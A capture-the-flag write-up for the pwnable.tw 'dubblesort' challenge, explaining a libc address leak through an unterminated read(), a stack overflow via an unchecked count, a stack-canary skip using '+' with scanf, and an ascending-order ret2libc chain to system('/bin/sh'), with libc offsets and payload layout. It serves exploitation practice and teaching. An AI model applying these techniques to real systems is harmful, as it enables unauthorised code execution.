# dubblesort (200 pts)

> Sort the memory!
>
> `nc chall.pwnable.tw 10101`

## Challenge Overview

A 32-bit Linux binary that asks for your name, then prompts you to enter numbers which it sorts and displays.

## Binary Analysis

```bash
$ file dubblesort
dubblesort: ELF 32-bit LSB shared object, Intel 80386, dynamically linked

$ checksec dubblesort
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

All protections enabled! We need to:
1. Bypass ASLR by leaking a libc address
2. Bypass the canary without corrupting it
3. Build a ROP chain that works despite the sorting

## Vulnerability Analysis

### 1. Information Leak via `read()`

The program reads the username using `read(0, buffer, 0x40)`:

```c
read(0, name_buf, 0x40);  // at esp+0x3c
printf("Hello %s, How many numbers...");
```

`read()` doesn't null-terminate the buffer. When `printf("%s")` prints the name, it continues reading until it hits a null byte. The stack contains residual libc addresses that get leaked.

### 2. Stack Buffer Overflow

The program reads an arbitrary count of numbers without bounds checking:

```c
scanf("%u", &count);       // at esp+0x18
for (i = 0; i < count; i++) {
    scanf("%u", &numbers[i]);  // numbers starts at esp+0x1c
}
```

The numbers array can overflow past its allocation, overwriting the canary, saved registers, and return address.

### 3. Canary Bypass via `scanf()` Behavior

When `scanf("%u")` encounters input it cannot parse as an unsigned integer (like just `+` or `-`), it returns without modifying the destination variable. This means:

- If we send `+` when it asks for the number at the canary's position
- `scanf` fails to parse it, leaves the canary unchanged
- We bypass the stack canary protection!

### 4. Sorting Challenge

The program uses bubble sort to sort all numbers in ascending order. This means our ROP chain will get scrambled unless we input values that are already sorted!

**Solution**: Input small values (0, 1, 2...) before the canary, skip the canary with `+`, then input our ROP chain addresses in ascending order.

**Critical issue**: The canary is a random value. After sorting:
- If canary < our smallest libc address (~33% chance): canary stays in place, exploit works
- If canary > our addresses: canary moves to end, stack check fails

## Stack Layout

```
esp+0x18: count
esp+0x1c: numbers[0]   ─┐
esp+0x20: numbers[1]    │
   ...                  │ 24 elements before canary
esp+0x78: numbers[23]  ─┘
esp+0x7c: numbers[24] = CANARY (skip with '+')
esp+0x80: numbers[25] = saved ebx
esp+0x84: numbers[26] = saved esi
esp+0x88: numbers[27] = saved edi
   ...   (alignment padding)
esp+0x9c: numbers[32] = return address
esp+0xA0: numbers[33] = system's return
esp+0xA4: numbers[34] = system's argument
```

## Exploitation Strategy

### Step 1: Leak libc Address

Send 32 bytes for the name. The remaining stack data contains libc addresses that get printed by `printf("%s")`. The leaked address at position 32 ends in `0x601`.

### Step 2: Calculate libc Base

```python
# Leak at position 32, offset varies by environment
libc_base = leaked_addr - 0x1ae601  # May need calibration
libc_base &= 0xfffff000  # Align to page boundary
```

### Step 3: Build Ascending ROP Chain

For ret2libc, we need: `system` → `dummy_ret` → `/bin/sh`

Key insight: In this libc, `system (0x3a940) < /bin/sh (0x158e8b)`, so the addresses are naturally in ascending order!

```python
# All values must be ascending after sort
numbers[0-23]  = 0, 1, 2, ... 23       # Small values
numbers[24]    = '+' (skip canary)
numbers[25-31] = libc_base             # Padding (7 values)
numbers[32]    = system                # Return address
numbers[33]    = system                # Dummy return
numbers[34]    = /bin/sh               # Argument to system
```

After bubble sort, everything stays in place because values are already sorted!

## Libc Offsets

From provided `libc_32.so.6` (glibc 2.23):
```
system:            0x3a940
/bin/sh:           0x158e8b
```

Leak offsets (may vary by environment):
```
Position 32 (ends in 0x601): 0x1ae601
Position 36 (ends in 0x7a9): 0x1ae7a9
Position 40 (ends in 0xfa0): 0x1affa0
```

## Key Takeaways

1. **`read()` doesn't null-terminate**: Useful for leaking stack data via `printf("%s")`
2. **`scanf()` failure preserves data**: Sending unparseable input like `+` skips writes, bypassing canary
3. **Sorting algorithms affect ROP**: When input gets sorted, craft payloads that are already in sorted order
4. **Canary randomness matters**: Success depends on canary being smaller than libc addresses (~33% per attempt)
5. **PIE + ASLR bypass**: Leak any libc address to calculate base, all offsets remain constant

## Flag

```
FLAG{XXXXXXXXXXXXXXXXXXXX}
```

## References

- [HackMD Writeup](https://hackmd.io/@wxrdnx/r1CXaFHdv)
- [GitHub Gist](https://gist.github.com/bin2415/d41da2d1ff6c6fd72e6b4f6e59049b84)
